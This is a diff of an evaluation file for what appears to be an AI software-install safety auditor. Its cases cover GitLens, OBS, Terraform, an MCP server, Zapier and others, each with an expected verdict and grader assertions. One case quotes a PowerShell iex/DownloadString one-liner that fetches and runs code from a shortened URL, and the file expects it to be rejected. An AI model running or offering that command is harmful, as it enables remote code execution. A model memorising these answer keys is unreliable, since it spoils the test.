         {"text": "Report mentions SHA pinning or tag-vs-SHA concern", "type": "contains_concept"},
         {"text": "Report mentions write permission or packages:write concern", "type": "contains_concept"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     },
     {
       "id": 28,
+      "workflow": "ide-plugin",
       "prompt": "Should I install the GitLens VS Code extension? It asks for a lot of permissions and wants me to sign in to GitKraken.",
       "expected_output": "Tier 2 standard audit. Routes to ide-plugin workflow. GitLens is well-known (tens of millions of installs, verified publisher on VS Code Marketplace), but the freemium model with GitKraken account requirement introduces data-sharing concerns — usage telemetry and sign-in data flow to GitKraken (Axosoft). Verdict CONDITIONAL: review GitKraken privacy policy, sign-in is optional for core features.",
       "files": [],
       "assertions": [
         {"text": "Subject type is ide-plugin", "type": "contains_concept"},
         {"text": "Report routes to ide-plugin workflow", "type": "contains_concept"},
-        {"text": "Verdict is CONDITIONAL or APPROVED", "type": "verdict_check"},
+        {"text": "Verdict is CONDITIONAL or APPROVED", "type": "verdict_check", "expected": ["APPROVED", "CONDITIONAL"]},
         {"text": "Report mentions GitKraken account or data-sharing concern", "type": "contains_concept"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     },
     {
       "id": 29,
+      "workflow": "desktop-app",
       "prompt": "I want to install OBS Studio for screen recording. The download page offers both the official installer and a Microsoft Store version. Which should I use?",
       "expected_output": "Tier 2 standard audit. Routes to desktop-app workflow. OBS Studio is well-known open-source screen recording software from the OBS Project. The dual-distribution question is an edge case: both the official installer (obsproject.com) and the Microsoft Store version are legitimate distribution channels — MS Store version may have sandbox restrictions but is signed and reviewed. Verdict APPROVED or CONDITIONAL. Should recommend the official installer or MS Store version and note provenance verification for each.",
       "files": [],
       "assertions": [
         {"text": "Subject type is desktop-app", "type": "contains_concept"},
         {"text": "Report routes to desktop-app workflow", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED or CONDITIONAL", "type": "verdict_check"},
+        {"text": "Verdict is APPROVED or CONDITIONAL", "type": "verdict_check", "expected": ["APPROVED", "CONDITIONAL"]},
         {"text": "Report mentions provenance or distribution channel comparison", "type": "contains_concept"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     },
     {
       "id": 30,
+      "workflow": "cli-binary",
       "prompt": "I want to install terraform from HashiCorp. My company proxy blocks releases.hashicorp.com so a colleague put the binary on a shared network drive. Can I use that copy?",
       "expected_output": "Tier 2/3 audit. Routes to cli-binary workflow. Terraform itself is high-trust (HashiCorp/IBM, official binary with SHA256SUMS and GPG signature), but the shared-drive copy breaks the provenance chain — the binary cannot be verified as unmodified without comparing against the official SHA256SUMS. Verdict CONDITIONAL: verify the binary checksum against HashiCorp's published SHA256SUMS before use, or obtain through an official channel (Homebrew, apt, official installer).",
       "files": [],
       "assertions": [
         {"text": "Subject type is cli-binary", "type": "contains_concept"},
         {"text": "Report routes to cli-binary workflow", "type": "contains_concept"},
-        {"text": "Verdict is CONDITIONAL", "type": "verdict_check"},
+        {"text": "Verdict is CONDITIONAL", "type": "verdict_check", "expected": ["CONDITIONAL"]},
         {"text": "Report mentions checksum or signature verification", "type": "contains_concept"},
         {"text": "Report mentions provenance concern with shared drive or third-party copy", "type": "contains_concept"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     },
     {
       "id": 31,
+      "workflow": "agent-extension",
       "prompt": "I want to add the Brave Search MCP server to my Claude Desktop setup. It says it needs an API key. Is this safe?",
       "expected_output": "Tier 2 standard audit. Routes to agent-extension workflow. Brave Search is a known search provider; the MCP server is community-maintained (not first-party from Brave). The API key requirement creates a credential exposure surface — the key is passed via env var and could be logged or leaked by a malicious or buggy MCP server. Verdict CONDITIONAL: verify the MCP server source/publisher, review API key scope, ensure key is not logged or exposed.",
       "files": [],
       "assertions": [
         {"text": "Subject type is agent-extension", "type": "contains_concept"},
         {"text": "Report routes to agent-extension workflow", "type": "contains_concept"},
-        {"text": "Verdict is CONDITIONAL or APPROVED", "type": "verdict_check"},
+        {"text": "Verdict is CONDITIONAL or APPROVED", "type": "verdict_check", "expected": ["APPROVED", "CONDITIONAL"]},
         {"text": "Report mentions API key or credential exposure concern", "type": "contains_concept"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     },
     {
       "id": 32,
+      "workflow": "remote-integration",
       "prompt": "Our team wants to connect Zapier to our GitHub org to automate issue labeling. Zapier needs repo and org read access. Is this safe?",
       "expected_output": "Tier 2 standard audit. Routes to remote-integration workflow. Zapier is a well-known automation platform (Zapier Inc, established vendor), but org-level GitHub access with repo read is broad — it covers all repositories in the org, not just specific ones. Verdict CONDITIONAL: restrict to minimum necessary repositories via fine-grained token, review Zapier's data retention policy, ensure only required repos are accessible.",
       "files": [],
       "assertions": [
         {"text": "Subject type is remote-integration", "type": "contains_concept"},
         {"text": "Report routes to remote-integration workflow", "type": "contains_concept"},
-        {"text": "Verdict is CONDITIONAL", "type": "verdict_check"},
+        {"text": "Verdict is CONDITIONAL", "type": "verdict_check", "expected": ["CONDITIONAL"]},
         {"text": "Report mentions scope or permission breadth concern", "type": "contains_concept"},
         {"text": "Report mentions data access or retention concern", "type": "contains_concept"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     },
     {
       "id": 33,
+      "workflow": "generic",
       "prompt": "My team uses an internal tool called 'buildwatch' that we access through a web portal at buildwatch.internal.company.com. IT says we need to 'install' it but really it's just bookmarking the URL and accepting a browser certificate. Is this safe?",
       "expected_output": "Low classifier confidence — not a package, extension, container, or app in the traditional sense. Routes to generic.md fallback. Probe phase should clarify: this is a web portal accessed via browser, not a traditional installable artifact. The only trust boundary is the browser certificate acceptance. Verdict APPROVED or CONDITIONAL (verify the certificate is issued by the company's internal CA, not self-signed by an unknown party).",
       "files": [],
       "assertions": [
         {"text": "Report routes to generic fallback or low-confidence path", "type": "contains_concept"},
         {"text": "Report mentions classifier uncertainty or ambiguous subject type", "type": "contains_concept"},
-        {"text": "Report is saved to a .md file", "type": "file_exists"},
-        {"text": "## Audit Coverage", "type": "contains_string"},
+        {"text": "Report is saved to a .md file", "type": "file_exists", "glob": "audit-*.md"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"},
         {"text": "Audit confidence", "type": "contains_concept"}
       ]
     },
     {
       "id": 34,
+      "workflow": "generic",
       "prompt": "Someone on a forum said I should run this PowerShell one-liner to install a productivity tool: iex ((New-Object System.Net.WebClient).DownloadString('http://bit.ly/toolsetup')). Is this safe?",
       "expected_output": "Low classifier confidence — could be cli-binary, desktop-app, or something else; the subject type is unclear from the prompt. Routes to generic.md fallback. The iex (Invoke-Expression) pattern combined with a shortened URL is a major red flag regardless of subject type: this is a classic remote code execution vector with no provenance, no checksum, no publisher identity. Verdict REJECTED.",
       "files": [],
       "assertions": [
         {"text": "Report routes to generic fallback or low-confidence path", "type": "contains_concept"},
-        {"text": "Verdict is REJECTED", "type": "exact_match"},
+        {"text": "Verdict is REJECTED", "type": "exact_match", "expected": "REJECTED"},
         {"text": "Report mentions remote code execution or iex risk", "type": "contains_concept"},
         {"text": "Report mentions shortened URL as a red flag", "type": "contains_concept"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     },
     {
       "id": 35,
+      "workflow": "generic",
       "prompt": "I found a GitHub repo that has a Dockerfile, an npm package, AND a VS Code extension all in one monorepo. The README says 'just run make install'. Should I?",
       "expected_output": "Low classifier confidence — multiple competing subject types (container-image, registry-package, ide-plugin) in one repo; no single innermost trust boundary is clear. Routes to generic.md fallback. Probe phase should ask the user to clarify which component they intend to install. The `make install` pattern also warrants Makefile review before execution. Verdict depends on clarification; report should flag the ambiguity and the Makefile review requirement.",
       "files": [],
@@ -503,12 +539,13 @@
         {"text": "Report routes to generic fallback or low-confidence path", "type": "contains_concept"},
         {"text": "Report mentions multiple subject types or ambiguity", "type": "contains_concept"},
         {"text": "Report mentions need for clarification on which component to install", "type": "contains_concept"},
-        {"text": "Report is saved to a .md file", "type": "file_exists"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "Report is saved to a .md file", "type": "file_exists", "glob": "audit-*.md"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     },
     {
       "id": 36,
+      "workflow": "registry-package",
       "prompt": "I want to install Prettier for code formatting — npm install -g prettier. I know it installs a CLI binary. Should I think of this as a CLI tool audit or an npm package audit?",
       "expected_output": "Routes to registry-package workflow (Type 1), not cli-binary. The innermost trust boundary is the npm registry — the CLI binary exists only because npm delivered it. The trust gate is npm's publishing process; the binary is downstream. Standard/Tier 1 audit. Prettier is high-trust (massive downloads, well-known maintainers). Verdict APPROVED.",
       "files": [],
@@ -516,13 +553,14 @@
         {"text": "Subject type is registry-package", "type": "contains_concept"},
         {"text": "Report routes to registry-package workflow, not cli-binary", "type": "contains_concept"},
         {"text": "Report explains innermost trust boundary is npm registry", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED", "type": "exact_match"},
-        {"text": "Report is saved to a .md file", "type": "file_exists"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "Verdict is APPROVED", "type": "exact_match", "expected": "APPROVED"},
+        {"text": "Report is saved to a .md file", "type": "file_exists", "glob": "audit-*.md"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     },
     {
       "id": 37,
+      "workflow": "ide-plugin",
       "prompt": "I want to install the rust-analyzer VS Code extension. I know it downloads a native binary (the LSP server) under the hood. Should this be audited as a binary download or as a VS Code extension?",
       "expected_output": "Routes to ide-plugin workflow (Type 3), not cli-binary. The innermost trust boundary is the VS Code Marketplace — the user clicks 'Install' in VS Code, and the marketplace is the verification layer. The bundled LSP binary is downstream, audited under the ide-plugin rubric. Standard/Tier 1 audit. rust-analyzer is well-known, high installs, active maintainers. Verdict APPROVED.",
       "files": [],
@@ -531,12 +569,13 @@
         {"text": "Report routes to ide-plugin workflow, not cli-binary", "type": "contains_concept"},
         {"text": "Report explains innermost trust boundary is VS Code Marketplace", "type": "contains_concept"},
         {"text": "Report mentions the bundled binary is audited within the ide-plugin rubric", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED", "type": "exact_match"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "Verdict is APPROVED", "type": "exact_match", "expected": "APPROVED"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     },
     {
       "id": 38,
+      "workflow": "container-image",
       "prompt": "Our team publishes a Node.js microservice as a Docker image on Docker Hub: docker pull acmecorp/invoice-api. The image is just an Express app with npm dependencies baked into the layer. Should I audit the npm packages or the Docker image?",
       "expected_output": "Routes to container-image workflow (Type 4), not registry-package. The innermost trust boundary is the container registry — the user runs docker pull, and Docker Hub is the trust gate the user personally crosses. The npm packages inside are audited as a sub-step within the container-image workflow if they warrant separate attention. Tier 2 audit. Verdict CONDITIONAL (review image provenance, Dockerfile best practices, and whether baked-in npm dependencies introduce known vulnerabilities).",
       "files": [],
@@ -545,12 +584,13 @@
         {"text": "Report routes to container-image workflow, not registry-package", "type": "contains_concept"},
         {"text": "Report explains innermost trust boundary is the container registry", "type": "contains_concept"},
         {"text": "Report mentions npm dependencies as sub-step or secondary concern", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED or CONDITIONAL", "type": "verdict_check"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "Verdict is APPROVED or CONDITIONAL", "type": "verdict_check", "expected": ["APPROVED", "CONDITIONAL"]},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     },
     {
       "id": 39,
+      "workflow": "ci-action",
       "prompt": "I want to use the docker/build-push-action GitHub Action in our CI pipeline. I see it pulls a Docker image internally to do the build. Should I audit the Docker image or the GitHub Action itself?",
       "expected_output": "Routes to ci-action workflow (Type 5), not container-image. The innermost trust boundary is the GitHub Actions marketplace — the user writes `uses: docker/build-push-action@v5` in their workflow file. The Docker image pulled internally is an implementation detail covered by the ci-action workflow's transitive-action surface analysis. Tier 1/2 audit. docker/build-push-action is a Docker-verified, widely-used action. Verdict APPROVED.",
       "files": [],
@@ -559,12 +599,13 @@
         {"text": "Report routes to ci-action workflow, not container-image", "type": "contains_concept"},
         {"text": "Report explains innermost trust boundary is the GitHub Actions marketplace", "type": "contains_concept"},
         {"text": "Report mentions Docker image as implementation detail or transitive concern", "type": "contains_concept"},
-        {"text": "Verdict is APPROVED", "type": "exact_match"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "Verdict is APPROVED", "type": "exact_match", "expected": "APPROVED"},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     },
     {
       "id": 40,
+      "workflow": "registry-package",
       "prompt": "I found a Claude Code skill on npm — npm install -g @anthropic/some-code-skill. It contains SKILL.md and scripts/. Should I audit this as a Claude Code skill (agent-extension) or as an npm package?",
       "expected_output": "Routes to registry-package workflow (Type 1), not agent-extension. The innermost trust boundary is the npm registry — the user runs npm install, so npm's publishing process is the trust gate. The skill content (SKILL.md, scripts/) is downstream and audited within the registry-package workflow. The workflow may invoke agent-extension sub-rubric signals for the skill content if warranted. Tier 2 audit. Verdict CONDITIONAL (skill content requires review of capability scope, but install gate is npm).",
       "files": [],
@@ -573,8 +614,8 @@
         {"text": "Report routes to registry-package workflow, not agent-extension", "type": "contains_concept"},
         {"text": "Report explains innermost trust boundary is npm registry", "type": "contains_concept"},
         {"text": "Report mentions skill content as downstream concern", "type": "contains_concept"},
-        {"text": "Verdict is CONDITIONAL or APPROVED", "type": "verdict_check"},
-        {"text": "## Audit Coverage", "type": "contains_string"}
+        {"text": "Verdict is CONDITIONAL or APPROVED", "type": "verdict_check", "expected": ["APPROVED", "CONDITIONAL"]},
+        {"text": "## Audit Coverage", "type": "contains_string", "value": "## Audit Coverage"}
       ]
     }
   ]
